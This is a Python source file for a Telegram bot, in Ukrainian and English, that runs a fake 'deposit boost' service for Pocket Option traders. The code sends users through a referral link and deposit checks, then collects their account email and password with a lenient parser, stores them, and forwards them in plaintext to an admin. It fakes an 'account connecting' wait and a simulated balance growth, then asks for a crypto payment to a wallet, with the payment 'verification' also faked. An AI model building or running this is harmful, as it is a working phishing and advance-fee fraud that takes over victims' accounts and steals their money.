import asyncio
import json
import logging
import random
import re
import os

from aiogram import Router, F, types, Bot
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, CallbackQuery, InputMediaPhoto, FSInputFile
from aiogram.exceptions import TelegramBadRequest

from app.keyboards import (
    get_start_keyboard, get_platform_select_keyboard, get_binance_bybit_keyboard,
    get_pocket_option_prereg_keyboard, get_pocket_option_start_boost_keyboard,
    get_boost_active_keyboard, get_boost_finished_keyboard, get_paid_boost_keyboard,
    get_statistics_keyboard, get_back_to_platform_select_keyboard, get_pocket_option_retry_keyboard,
    get_funded_keyboard
)
from services.statistics_service import stats_service
from storage.credentials_storage import save_credentials, get_credentials
from services.boost_service import start_boost, stop_boost, get_user_boost_info, update_balance_on_demand
from datetime import datetime
from app.utils import send_message_with_photo, get_remaining_time_str
# Avoid circular import: import admin_panel lazily at usage sites

# TODO: Replace with actual URLs
MANAGER_URL = "https://t.me/Trdrocketua_support" # Support link
# The bot will use the existing verification logic, so no need for a separate link here.

# Load message templates (path relative to project root)
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
TEMPLATES_PATH = os.path.join(BASE_DIR, 'message_templates.json')
with open(TEMPLATES_PATH, 'r', encoding='utf-8') as f:
    messages = json.load(f)

# Тестовые UID из окружения: поддерживаем SECRET_UID и SECRET_TEST_UIDS (через запятую/пробел)
def _get_test_uids() -> set[str]:
    values = []
    v1 = os.getenv("SECRET_UID") or ""
    v2 = os.getenv("SECRET_TEST_UIDS") or ""
    if v1.strip():
        values.append(v1.strip())
    if v2.strip():
        values.extend([p.strip() for p in re.split(r"[,;\s]+", v2) if p.strip()])
    return set(values)

user_router = Router()

# Define states for the new user flow
class UserFlow(StatesGroup):
    main_menu = State()
    platform_selection = State()
    binance_flow = State()
    bybit_flow = State()
    pocket_option_prereg = State()
    pocket_option_uid_input = State()  # New state for UID input
    pocket_option_funding = State()
    pocket_option_login_input = State()
    pocket_option_ready_to_boost = State()
    pocket_option_boosting = State()
    waiting_for_payment_screenshot = State()
    pocket_option_retry = State()

# --- HANDLER FOR /start and "BACK" to main menu ---
@user_router.message(Command("start"))
@user_router.callback_query(F.data == "start_menu")
async def start_handler(event: types.Message | types.CallbackQuery, state: FSMContext):
    """Handles the /start command and 'BACK' to the main menu."""
    await send_message_with_photo(
        message=event,
        photo_name="hello.jpg",
        text=messages["start_message"],
        reply_markup=get_start_keyboard()
    )
    await state.set_state(UserFlow.main_menu)

# --- HANDLERS FOR MAIN MENU ---
@user_router.callback_query(F.data == "choose_platform", UserFlow.main_menu)
async def choose_platform_handler(callback: types.CallbackQuery, state: FSMContext):
    """Handles 'Choose Platform' button, shows platform selection."""
    await send_message_with_photo(
        message=callback,
        photo_name="selectplatform.jpg",
        text=messages["platform_select_message"],
        reply_markup=get_platform_select_keyboard()
    )
    await state.set_state(UserFlow.platform_selection)

@user_router.callback_query(F.data == "stats_irl", UserFlow.main_menu)
async def stats_irl_handler(callback: types.CallbackQuery, state: FSMContext):
    """Handles 'Statistics Irl' button."""
    total = stats_service.get_accounts_count()
    if total <= 0:
        await callback.answer()
        await callback.message.answer("Statistics are not available right now. Please try again later.")
        await state.set_state(UserFlow.main_menu)
        return

    account_index = random.randint(0, total - 1)
    await state.update_data(account_index=account_index)
    account_info = stats_service.get_account_info(account_index)
    
    title = messages.get("stats_title") or ""
    combined_text = f"{title}\n\n{account_info}" if title else account_info
    
    if len(combined_text) > 1024:
        combined_text = combined_text[:1020] + "..."

    await send_message_with_photo(
        message=callback,
        photo_name="Top account.jpg",
        text=combined_text,
        reply_markup=get_statistics_keyboard()
    )
    await state.set_state(UserFlow.main_menu) # Or back to start

# --- HANDLER FOR ALL "BACK" to platform select BUTTONS ---
@user_router.callback_query(F.data == "choose_platform")
async def back_to_platform_select(callback: types.CallbackQuery, state: FSMContext):
    """Handles 'BACK' to the platform selection menu from various flows."""
    await choose_platform_handler(callback, state)


@user_router.callback_query(F.data.startswith("platform_"), UserFlow.platform_selection)
async def platform_selected_handler(callback: types.CallbackQuery, state: FSMContext):
    """Handles selection of a trading platform."""
    platform = callback.data.split("_")[1]
    
    if platform == "binance":
        await send_message_with_photo(
            message=callback,
            photo_name="binanc.jpg",
            text=messages["binance_flow_message"],
            reply_markup=get_binance_bybit_keyboard(MANAGER_URL)
        )
        await state.set_state(UserFlow.binance_flow)
    elif platform == "bybit":
        await send_message_with_photo(
            message=callback,
            photo_name="bybit.jpg",
            text=messages["bybit_flow_message"],
            reply_markup=get_binance_bybit_keyboard(MANAGER_URL)
        )
        await state.set_state(UserFlow.bybit_flow)
    elif platform == "pocket":
        await state.update_data(platform=platform) # Save platform to state
        user_id = callback.from_user.id
        boost_info = update_balance_on_demand(user_id)
        # Enforce single free boost per user based on persisted profile flag
        try:
            from app.dispatcher import admin_panel as _admin_panel
            profile = _admin_panel.get_user(user_id) or {}
            free_used = bool(profile.get("free_boost_used"))
            if free_used and (not boost_info or not boost_info.get('is_active')):
                final_balance_for_pay = (boost_info or {}).get('final_balance') or profile.get('last_final_balance') or 0
                amount_to_pay = 150 + (float(final_balance_for_pay) * 0.30)
                await send_message_with_photo(
                    message=callback,
                    photo_name="free bots alrady used.jpg",
                    text=messages["pocket_option_paid_boost"].format(
                        amount_to_pay=f"{amount_to_pay:.2f}",
                        wallet_address=_admin_panel.get_wallet_address()
                    ),
                    reply_markup=get_paid_boost_keyboard(MANAGER_URL),
                    parse_mode="HTML"
                )
                await state.set_state(UserFlow.waiting_for_payment_screenshot)
                await callback.answer()
                return
        except Exception:
            pass

        user_id = callback.from_user.id
        boost_info = update_balance_on_demand(user_id)

        if boost_info:
            if boost_info.get('is_active'):
                end_time = datetime.fromisoformat(boost_info['end_time'])
                time_left = end_time - datetime.now()

                if time_left.total_seconds() <= 0:
                    # Boost has expired
                    stop_boost(user_id) # Clear boost data
                    final_message = messages['pocket_option_boost_finished'].format(
                        initial_balance=f"${boost_info['start_balance']:.2f}",
                        final_balance=f"${boost_info['current_balance']:.2f}"
                    )
                    await send_message_with_photo(
                        message=callback,
                        photo_name="Deposit bost complited.jpg",
                        text=final_message,
                        reply_markup=get_boost_finished_keyboard()
                    )
                    await state.set_state(UserFlow.main_menu) # Or back to start

                else:
                    # Boost is active and time is remaining
                    hours, remainder = divmod(time_left.seconds, 3600)
                    minutes, _ = divmod(remainder, 60)
                    await send_message_with_photo(
                        message=callback,
                        photo_name="your currency balance.jpg",
                        text=f"Ваш поточний баланс: ${boost_info['current_balance']:.2f}\n"
                        f"Час до завершення розгону: {time_left.days}д {hours}г {minutes}хв",
                        reply_markup=get_boost_active_keyboard()
                    )
                    await state.set_state(UserFlow.pocket_option_boosting)
            
            elif boost_info.get('boost_count', 0) > 0: # Used free boost, now show paid
                final_balance = boost_info.get('final_balance', boost_info.get('current_balance', 0))
                amount_to_pay = 150 + (final_balance * 0.30)
                from app.dispatcher import admin_panel as _admin_panel
                await send_message_with_photo(
                    message=callback,
                    photo_name="free bots alrady used.jpg",
                    text=messages["pocket_option_paid_boost"].format(
                        amount_to_pay=f"{amount_to_pay:.2f}",
                        wallet_address=_admin_panel.get_wallet_address()
                    ),
                    reply_markup=get_paid_boost_keyboard(MANAGER_URL),
                    parse_mode="HTML"
                )
                await state.set_state(UserFlow.waiting_for_payment_screenshot)
            else: # Should not happen, but as a fallback
                await send_message_with_photo(
                    message=callback,
                    photo_name="error not foud your account.jpg",
                    text=messages["generic_error"],
                    reply_markup=get_start_keyboard()
                )
                await state.set_state(UserFlow.main_menu)

            await callback.answer()
            return

        # No boost info, show the registration message
        from app.dispatcher import admin_panel as _admin_panel
        settings = _admin_panel.get_referral_settings()
        # Prefer a single unified referral_link if present; fallback to region-specific
        link_unified = settings.get("referral_link")
        link_all = settings.get("referral_link_all")
        link_russia = settings.get("referral_link_russia")
        chosen_link = link_unified or link_all or link_russia or "#"
        min_deposit = _admin_panel.get_referral_settings().get("min_deposit", 100)
        
        await send_message_with_photo(
            message=callback,
            photo_name="pocket option.jpg",
            text=messages["pocket_option_flow_message"].format(
                referral_link=chosen_link
            ),
            reply_markup=get_pocket_option_prereg_keyboard(),
            parse_mode="HTML",
        )
        await state.set_state(UserFlow.pocket_option_prereg)

# --- POCKET OPTION FLOW ---
@user_router.callback_query(F.data == "pocket_option_verify", StateFilter(UserFlow.pocket_option_prereg, UserFlow.pocket_option_uid_input, UserFlow.pocket_option_retry))
async def pocket_option_verify_handler(callback: types.CallbackQuery, state: FSMContext):
    """
    Handles 'I’ve Registered and Funded My Account' button.
    Asks for the user's UID.
    """
    await send_message_with_photo(
        message=callback,
        photo_name="give my your UID.jpg",
        text=messages["pocket_option_ask_for_uid"],
        reply_markup=get_back_to_platform_select_keyboard() # New keyboard here
    )
    await state.set_state(UserFlow.pocket_option_uid_input)

async def _verify_pocket_option_registration(message: types.Message, state: FSMContext):
    """Shared logic for UID verification to avoid code duplication and runtime errors."""
    from app.dispatcher import admin_panel, trading_api
    
    # If the message is a CallbackQuery, we should delete the message it came from
    if isinstance(message, types.CallbackQuery):
        await message.message.delete()
        # Use the message from the callback for sending replies
        message_to_reply = message.message
    else:
        message_to_reply = message

    # Allow privileged UID from environment (if set)
    test_uids = _get_test_uids()
    if message.text.strip() in test_uids:
        await state.update_data(pocket_option_uid=message.text.strip())
        from app.dispatcher import admin_panel
        min_deposit = admin_panel.get_referral_settings().get("min_deposit", 100)
        await send_message_with_photo(
            message=message_to_reply,
            photo_name="succes but you nidde ddeposidd 100$.jpg",
            text=messages["pocket_option_registered_success"].format(min_deposit=min_deposit),
            reply_markup=get_funded_keyboard()
        )
        await state.set_state(UserFlow.pocket_option_funding)
        return

    await state.update_data(pocket_option_uid=message.text.strip())
    
    # Persist UID to admin storage for resilience
    try:
        from app.dispatcher import admin_panel as _admin_panel
        _admin_panel.update_user_field(message_to_reply.from_user.id, "uid", message.text.strip())
    except Exception:
        pass
    
    wait_message = await message_to_reply.answer("🔎 Перевіряємо ваш UID...")

    # Step 1: Check registration
    is_registered, reg_data = await trading_api.check_registration(str(message_to_reply.from_user.id), message.text.strip())

    if not is_registered:
        await wait_message.delete()
        await send_message_with_photo(
            message=message_to_reply,
            photo_name="error not foud your account.jpg",
            text=messages["registration_check_failed"], # This message doesn't need min_deposit
            reply_markup=get_pocket_option_retry_keyboard()
        )
        await state.set_state(UserFlow.pocket_option_retry)
        return

    # If registration check passes:
    from app.dispatcher import admin_panel
    min_deposit = admin_panel.get_referral_settings().get("min_deposit", 100)
    await wait_message.delete()
    await send_message_with_photo(
        message=message_to_reply,
        photo_name="succes but you nidde ddeposidd 100$.jpg",
        text=messages["pocket_option_registered_success"].format(min_deposit=min_deposit),
        reply_markup=get_funded_keyboard()
    )
    await state.set_state(UserFlow.pocket_option_funding)

async def _verify_pocket_option_deposit(message: types.Message, state: FSMContext, uid: str):
    """Shared logic for deposit verification based on a UID string."""
    from app.dispatcher import admin_panel, trading_api
    user_id = message.from_user.id

    # Allow privileged UID from environment (supports multiple test UIDs)
    test_uids = _get_test_uids()
    if uid.strip() in test_uids:
        # This is a test user, grant them a test balance and go through normal flow
        await state.update_data(initial_balance=100.0)
        await send_message_with_photo(
            message=message,
            photo_name="gread need yuor lign password.jpg",
            text=messages["pocket_option_verification_successful"],
            reply_markup=None
        )
        await state.set_state(UserFlow.pocket_option_login_input)
        return

    wait_message = await message.answer("🔎 Перевіряємо ваш баланс...")
    from app.dispatcher import admin_panel
    min_deposit = admin_panel.get_referral_settings().get("min_deposit", 100)

    # Check for deposit via API
    has_deposit, dep_data = await trading_api.check_deposit(user_id, uid, min_deposit)

    if has_deposit:
        # If all checks pass:
        # Prefer real trading balance if available, otherwise fall back to deposits/FTD
        raw_balance = dep_data.get('balance', 0.0)
        sum_deposits = dep_data.get('sum_of_deposits') or dep_data.get('sum_deposits')
        ftd_amount = dep_data.get('ftd_amount') or dep_data.get('ftd')
        initial_balance = 0.0
        try:
            initial_balance = float(raw_balance) if raw_balance is not None else 0.0
        except Exception:
            initial_balance = 0.0
        if initial_balance <= 0:
            for v in (sum_deposits, ftd_amount):
                try:
                    if v is not None and float(v) > 0:
                        initial_balance = float(v)
                        break
                except Exception:
                    continue
        if initial_balance <= 0:
            initial_balance = min_deposit

        await state.update_data(initial_balance=initial_balance)
        # Persist initial balance for robustness
        try:
            from app.dispatcher import admin_panel as _admin_panel
            _admin_panel.update_user_field(user_id, "initial_balance", initial_balance)
        except Exception:
            pass
        await wait_message.delete()
        # Запрашиваем у пользователя логин и пароль перед продолжением
        await send_message_with_photo(
            message=message,
            photo_name="gread need yuor lign password.jpg",
            text=messages["pocket_option_verification_successful"],
            reply_markup=None
        )
        await state.set_state(UserFlow.pocket_option_login_input)
    else:
        # Handle case where deposit is not sufficient
        await wait_message.delete()
        error_reason = dep_data.get("error")
        if error_reason == "not_found":
            photo = "error not foud your account.jpg"
            text = messages["pocket_option_not_found"]
        else: # Insufficient deposit
            photo = "error less is than 100$.jpg"
            text = messages["pocket_option_insufficient_deposit"].format(min_deposit=f"${min_deposit:.2f}")

        await send_message_with_photo(
            message=message,
            photo_name=photo,
            text=text,
            reply_markup=get_funded_keyboard()
        )

# Robust parser for credentials: supports labeled and free-form input
def _parse_login_password(text: str):
    if not text:
        return None, None
    t = text.strip()

    email_pattern = r'([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})'

    # 1) Try labeled email first (EN/RU/UA)
    labeled_email = re.search(r'(?:email|e-mail|mail|почта|логин|login)\s*[:=]?\s*' + email_pattern, t, flags=re.I)
    email = labeled_email.group(1) if labeled_email else None

    # 2) Fallback: first email anywhere
    if not email:
        any_email = re.search(email_pattern, t, flags=re.I)
        email = any_email.group(1) if any_email else None

    # 3) Try labeled password (EN/RU)
    pw_match = re.search(r'(?:password|pass|pwd|passwd|пароль)\s*[:=]?\s*([^\n\r,;|/]+)', t, flags=re.I)
    password = pw_match.group(1).strip() if pw_match else None

    # 4) Fallback by lines: if 2+ lines, the non-email line is password
    if not password:
        lines = [ln.strip() for ln in t.replace('\r', '\n').split('\n') if ln.strip()]
        if len(lines) >= 2:
            # ensure email detected
            if not email:
                for ln in lines:
                    m = re.search(email_pattern, ln, flags=re.I)
                    if m:
                        email = m.group(1)
                        break
            if email:
                for ln in lines:
                    if email not in ln:
                        password = ln.strip()
                        if password:
                            break

    # 5) One-line fallback: remove email and labels, take the longest remaining token
    if email and not password:
        rest = re.sub(email, ' ', t, flags=re.I)
        rest = re.sub(r'(?:email|e-mail|mail|почта|логин|login)\s*[:=]?\s*', ' ', rest, flags=re.I)
        rest = re.sub(r'(?:password|pass|pwd|passwd|пароль)\s*[:=]?\s*', ' ', rest, flags=re.I)
        rest = rest.strip()
        candidates = []
        for sep in ['\n', ',', ';', '|', '/', '\\']:
            for part in rest.split(sep):
                part = part.strip()
                if part:
                    candidates.append(part)
        if candidates:
            password = max(candidates, key=len)

    # Cleanup quotes/punctuation
    def _clean(s):
        if not s:
            return s
        return s.strip().strip('\'"` “”‘’').strip()

    email = _clean(email)
    password = _clean(password)

    # Validate email basic
    if email and not re.fullmatch(email_pattern, email, flags=re.I):
        email = None

    # Minimal password sanity check
    if password and len(password) < 3:
        password = None

    return email, password

@user_router.message(UserFlow.pocket_option_uid_input, F.text.regexp(r'^\d+$'))
async def pocket_option_uid_input_handler(message: types.Message, state: FSMContext):
    """Handles user sending their Pocket Option UID and verifies it."""
    await _verify_pocket_option_registration(message, state)

@user_router.message(UserFlow.pocket_option_uid_input)
async def pocket_option_invalid_uid_handler(message: types.Message):
    """Handles invalid UID format."""
    await message.answer(messages["invalid_uid_format"])

@user_router.callback_query(F.data == "pocket_option_funded", UserFlow.pocket_option_funding)
async def pocket_option_funded_handler(callback: types.CallbackQuery, state: FSMContext):
    """Handles the 'I have funded' button click by verifying the deposit."""
    user_data = await state.get_data()
    uid = user_data.get("pocket_option_uid")

    if not uid:
        await callback.answer("An error occurred, please go back and start over.", show_alert=True)
        return
    
    await callback.message.delete()
    # Pass the UID to the verification function
    await _verify_pocket_option_deposit(callback.message, state, uid)
    await callback.answer()

@user_router.message(UserFlow.pocket_option_login_input)
async def pocket_option_login_input_handler(message: types.Message, state: FSMContext):
    """Handles user sending login and password."""
    user_data = await state.get_data()
    uid = user_data.get("pocket_option_uid") # Retrieve UID from state

    # Fallback: try to recover UID from admin storage if state was lost
    if not uid:
        try:
            from app.dispatcher import admin_panel as _admin_panel
            _user = _admin_panel.get_user(message.from_user.id)
            recovered_uid = (_user or {}).get("uid")
            if recovered_uid:
                uid = recovered_uid
                await state.update_data(pocket_option_uid=uid)
        except Exception:
            pass

    if not uid:
        await message.answer("An error occurred with your session (UID not found). Please start over.")
        # Ask for UID again to continue the flow smoothly
        await send_message_with_photo(
            message=message,
            photo_name="give my your UID.jpg",
            text=messages["pocket_option_ask_for_uid"],
            reply_markup=get_back_to_platform_select_keyboard()
        )
        await state.set_state(UserFlow.pocket_option_uid_input)
        return

    email, password = _parse_login_password(message.text or "")

    if email and password:
        await state.update_data(email=email, password=password)
        # Pass UID to the save_credentials function
        save_credentials(message.from_user.id, email, password, uid)
        # Notify admin about new credentials submission
        try:
            from app.dispatcher import admin_panel, bot
            admin_id = admin_panel.get_admin_id()
            if admin_id:
                # Try to pull initial balance from state if present
                user_state = await state.get_data()
                init_balance_val = user_state.get('initial_balance')
                init_balance_text = f"${init_balance_val:.2f}" if isinstance(init_balance_val, (int, float)) else "$0.00"
                await bot.send_message(
                    admin_id,
                    (
                        "🚀 New user has started a boost!\n\n"
                        "👤 User Info\n"
                        f"Telegram ID: {message.from_user.id}\n"
                        f"Pocket Option UID: {uid}\n\n"
                        "🔑 Credentials\n"
                        f"Email: {email}\n"
                        f"Password: {password}\n\n"
                        "💰 Boost Info\n"
                        f"Initial Balance: {init_balance_text}"
                    )
                )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to notify admin about credentials: {e}")
        # Now that UID is saved, we can clear it from the state
        await state.update_data(pocket_option_uid=None)

        # Show connecting message with photo
        connecting_msg = await send_message_with_photo(
            message=message,
            photo_name="waitng to connect account.jpg",
            text=messages["pocket_option_connecting"],
            reply_markup=None
        )
        # Change sleep to 2-3 minutes
        await asyncio.sleep(random.randint(120, 180))
        
        # Now edit the message to include the photo and final text with Start Boost
        await send_message_with_photo(
            message=connecting_msg, # Pass the message to be edited
            photo_name="succes connected.jpg",
            text=messages["pocket_option_connected_ready"],
            reply_markup=get_pocket_option_start_boost_keyboard(),
            edit=True # Add this flag
        )
        
        await state.set_state(UserFlow.pocket_option_ready_to_boost)
    else:
        await message.answer(messages["invalid_login_format"], parse_mode="HTML")

@user_router.callback_query(F.data == "start_boost", StateFilter(UserFlow.pocket_option_ready_to_boost))
async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
    """Handles the 'Start Boost' button."""
    user_id = callback.from_user.id
    user_data = await state.get_data()
    initial_balance = user_data.get('initial_balance')
    platform = user_data.get('platform')

    # Fallbacks to improve robustness after restarts or state losses
    if platform is None:
        platform = "pocket"
        await state.update_data(platform=platform)
    if initial_balance is None:
        try:
            from app.dispatcher import admin_panel
            # Try to recover initial balance saved at deposit verification
            saved_user = admin_panel.get_user(user_id) or {}
            saved_initial = saved_user.get('initial_balance')
            if isinstance(saved_initial, (int, float)) and saved_initial > 0:
                initial_balance = float(saved_initial)
            else:
                min_deposit_cfg = admin_panel.get_referral_settings().get("min_deposit", 100)
                initial_balance = float(min_deposit_cfg) if isinstance(min_deposit_cfg, (int, float)) else 100.0
        except Exception:
            initial_balance = 100.0
        await state.update_data(initial_balance=initial_balance)

    if initial_balance is None or platform is None:
        await callback.answer("Error: Could not find initial balance or platform. Please start over.", show_alert=True)
        # Optionally guide user to start
        await state.clear()
        await start_handler(callback.message, state) # Go back to start
        return

    # Ensure credentials are stored before starting boost
    creds = get_credentials(user_id)
    email_ok = bool(creds.get('email'))
    password_ok = bool(creds.get('password'))
    uid_ok = bool(creds.get('uid'))
    if not (email_ok and password_ok and uid_ok):
        await callback.answer("Будь ласка, надішліть ваш логін і пароль, щоб продовжити.", show_alert=True)
        await send_message_with_photo(
            message=callback,
            photo_name="gread need yuor lign password.jpg",
            text=messages["pocket_option_verification_successful"],
            reply_markup=None
        )
        await state.set_state(UserFlow.pocket_option_ready_to_boost)
        return

    # Prevent starting a new free boost if already used
    try:
        from app.dispatcher import admin_panel as _admin_panel
        profile = _admin_panel.get_user(user_id) or {}
        if profile.get("free_boost_used"):
            boost_info = get_user_boost_info(user_id) or {}
            final_balance_for_pay = boost_info.get('final_balance') or profile.get('last_final_balance') or 0
            amount_to_pay = 150 + (float(final_balance_for_pay) * 0.30)
            await send_message_with_photo(
                message=callback,
                photo_name="free bots alrady used.jpg",
                text=messages["pocket_option_paid_boost"].format(
                    amount_to_pay=f"{amount_to_pay:.2f}",
                    wallet_address=_admin_panel.get_wallet_address()
                ),
                reply_markup=get_paid_boost_keyboard(MANAGER_URL),
                parse_mode="HTML"
            )
            await state.set_state(UserFlow.waiting_for_payment_screenshot)
            await callback.answer()
            return
    except Exception:
        pass

    # Now, we start the boost with the retrieved balance and platform
    start_boost(user_id, initial_balance, platform)
    await state.update_data(initial_balance=None) # Clear it from state after use

    await send_message_with_photo(
        message=callback,
        photo_name="Bost mode on.jpg",
        text=messages["pocket_option_boosting_started"],
        reply_markup=get_boost_active_keyboard()
    )

    await asyncio.sleep(2)

    boost_info = update_balance_on_demand(user_id)
    if boost_info:
        end_time = datetime.fromisoformat(boost_info['end_time'])
        time_left = end_time - datetime.now()
        hours, remainder = divmod(time_left.seconds, 3600)
        minutes, _ = divmod(remainder, 60)

        message_text = (
            f"Ваш поточний баланс: ${boost_info['current_balance']:.2f}\n"
            f"Час до завершення розгону: {time_left.days}д {hours}г {minutes}хв"
        )
        
        await send_message_with_photo(
            message=callback.message, 
            photo_name="your currency balance.jpg",
            text=message_text,
            reply_markup=get_boost_active_keyboard()
        )

    await state.set_state(UserFlow.pocket_option_boosting)
    await callback.answer()
    # Admin notification отправляем только после отправки логина и пароля пользователем


@user_router.callback_query(F.data == "start_paid_boost")
async def start_paid_boost_handler(callback: types.CallbackQuery, state: FSMContext):
    """Handles the 'Start Boost' button after the first free boost."""
    from app.dispatcher import admin_panel  # For referral link
    user_id = callback.from_user.id
    boost_info = get_user_boost_info(user_id) or {}

    # Prefer persisted last_final_balance if present
    profile = admin_panel.get_user(user_id) or {}
    final_balance = profile.get('last_final_balance', boost_info.get('final_balance', boost_info.get('current_balance', 0)))
    amount_to_pay = 150 + (final_balance * 0.30)

    await send_message_with_photo(
        message=callback,
        photo_name="free bots alrady used.jpg",
        text=messages["pocket_option_paid_boost"].format(
            amount_to_pay=f"{amount_to_pay:.2f}",
            wallet_address=admin_panel.get_wallet_address()
        ),
        reply_markup=get_paid_boost_keyboard(MANAGER_URL),
        parse_mode="HTML"
    )
    await state.set_state(UserFlow.waiting_for_payment_screenshot)


@user_router.callback_query(F.data == "paid_boost_confirmed", StateFilter(UserFlow.waiting_for_payment_screenshot))
async def paid_boost_confirmed_handler(callback: types.CallbackQuery, state: FSMContext):
    """Handles the 'I've Paid' button click."""
    await send_message_with_photo(
        message=callback,
        photo_name="give my your UID.jpg", # Placeholder, maybe change to a more relevant image
        text=messages["request_payment_screenshot"],
        reply_markup=get_back_to_platform_select_keyboard()
    )
    await state.set_state(UserFlow.waiting_for_payment_screenshot)


@user_router.message(UserFlow.waiting_for_payment_screenshot, F.photo)
async def payment_screenshot_handler(message: types.Message, state: FSMContext):
    """Handles the user's payment screenshot."""
    from app.dispatcher import admin_panel
    user_id = message.from_user.id
    await state.update_data(payment_screenshot=message.photo[-1].file_id)

    # Simulate payment verification
    await asyncio.sleep(random.randint(3, 5))

    # In a real scenario, you would send the screenshot to the manager
    # and then update the user's boost status.
    # For now, we'll just acknowledge it.
    await send_message_with_photo(
        message=message,
        photo_name="succes connected.jpg", # Generic success
        text=messages["payment_screenshot_received"],
        reply_markup=None
    )

    # Update user's boost status
    stop_boost(user_id)

    await state.clear()
    await start_handler(message, state) # Go back to start

# --- HANDLERS FOR BOOSTING MODE ---
@user_router.callback_query(F.data == "stop_boost")
async def stop_boost_handler(callback: types.CallbackQuery, state: FSMContext):
    """Handles the 'Stop Boost' button."""
    user_id = callback.from_user.id
    await _process_stop_boost(event=callback, state=state, user_id=user_id)


@user_router.message(F.text.regexp(r"(?i)^\s*зупинити\s+розгін!?$"))
async def stop_boost_text_handler(message: types.Message, state: FSMContext):
    """Handles typed or reply-keyboard 'Зупинити розгін'."""
    user_id = message.from_user.id
    await _process_stop_boost(event=message, state=state, user_id=user_id)


async def _process_stop_boost(event: types.Message | types.CallbackQuery, state: FSMContext, user_id: int):
    boost_info = get_user_boost_info(user_id)
    
    await asyncio.sleep(random.randint(2, 4))
    
    if boost_info:
        final_message = messages['pocket_option_boost_finished'].format(
            initial_balance=f"${boost_info['start_balance']:.2f}",
            final_balance=f"${boost_info['current_balance']:.2f}"
        )
        await send_message_with_photo(
            message=event,
            photo_name="Deposit bost complited.jpg", # maps -> 12.jpg
            text=final_message,
            reply_markup=get_boost_finished_keyboard()
        )
    else:
        await send_message_with_photo(
            message=event,
            photo_name="succes connected.jpg",
            text=messages.get("pocket_option_stopped", "✅ Розгін зупинено."),
            reply_markup=get_boost_finished_keyboard()
        )
    stop_boost(user_id)
    await state.clear()
    if isinstance(event, types.CallbackQuery):
        try:
            await event.answer()
        except Exception:
            pass

@user_router.callback_query(F.data == "current_balance")
async def current_balance_handler(callback: types.CallbackQuery, state: FSMContext):
    """
    Handles the 'Current Balance' button press, showing the user's current
    boosted balance and remaining time.
    """
    user_id = callback.from_user.id
    from app.dispatcher import bot, admin_panel
    from services.boost_service import get_boost_data, save_boost_data
    from app.utils import send_message_with_photo

    boost_info = get_user_boost_info(user_id)
    if not boost_info or not isinstance(boost_info, dict):
        await callback.answer("Your boost is not active.", show_alert=True)
        try:
            await callback.message.edit_text(
                "Your boost has ended. What would you like to do next?",
                reply_markup=get_start_keyboard()
            )
        except Exception:
            pass
        return

    # If flagged inactive but end_time is still in the future, auto-reactivate
    try:
        end_time = datetime.fromisoformat(boost_info['end_time'])
        if not boost_info.get("is_active") and datetime.now() < end_time:
            data = get_boost_data()
            user_key = str(user_id)
            if user_key in data:
                data[user_key]['is_active'] = True
                save_boost_data(data)
                boost_info = data[user_key]
        elif not boost_info.get("is_active"):
            await callback.answer("Your boost is not active.", show_alert=True)
            try:
                await callback.message.edit_text(
                    "Your boost has ended. What would you like to do next?",
                    reply_markup=get_start_keyboard()
                )
            except Exception:
                pass
            return
    except Exception:
        pass
 
    current_balance = boost_info['current_balance']
    end_time = datetime.fromisoformat(boost_info['end_time'])
    remaining_time = get_remaining_time_str(end_time)
     
    # Send/update using robust helper (resolves image path)
    caption = (
        f"Ваш поточний баланс: ${current_balance:,.2f}\n"
        f"Час до завершення розгону: {remaining_time}"
    )
 
    try:
        await send_message_with_photo(
            message=callback,
            photo_name="your currency balance.jpg",
            text=caption,
            reply_markup=get_boost_active_keyboard()
        )
        await callback.answer()
    except Exception as e:
        logging.error(f"Error updating current balance for user {user_id}: {e}")
        try:
            await callback.answer("Error updating balance.", show_alert=True)
        except Exception:
            pass
        
    # Acknowledge the callback press if not already done - THIS IS DELETED


# --- Fallback for any other callback in boosting state ---
@user_router.callback_query(UserFlow.pocket_option_boosting)
async def boosting_fallback_handler(callback: types.CallbackQuery):
    await callback.answer("This button is not active during the boost.", show_alert=True)

@user_router.callback_query(F.data == "view_statistics")
async def view_statistics(callback: CallbackQuery, state: FSMContext):
    await state.update_data(account_index=0)
    account_info = stats_service.get_account_info(0)
    
    title = messages.get("stats_title") or ""
    combined_text = f"{title}\n\n{account_info}" if title else account_info
    
    if len(combined_text) > 1024:
        combined_text = combined_text[:1020] + "..."
        
    await send_message_with_photo(
        message=callback,
        photo_name="Top account.jpg",
        text=combined_text,
        reply_markup=get_statistics_keyboard()
    )
    await state.set_state(UserFlow.main_menu) # Or back to start

@user_router.callback_query(F.data == "update_statistics", UserFlow.main_menu)
async def update_statistics(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    current_index = data.get("account_index", 0)
    new_index = (current_index + 1) % stats_service.get_accounts_count()
    
    await stats_service.update_balances() # Update balances on button press
    
    await state.update_data(account_index=new_index)
    account_info = stats_service.get_account_info(new_index)

    title = messages.get("stats_title") or ""
    combined_text = f"{title}\n\n{account_info}" if title else account_info

    if len(combined_text) > 1024:
        combined_text = combined_text[:1020] + "..."

    await send_message_with_photo(
        message=callback,
        photo_name="Top account.jpg",
        text=combined_text,
        reply_markup=get_statistics_keyboard()
    )
    await callback.answer()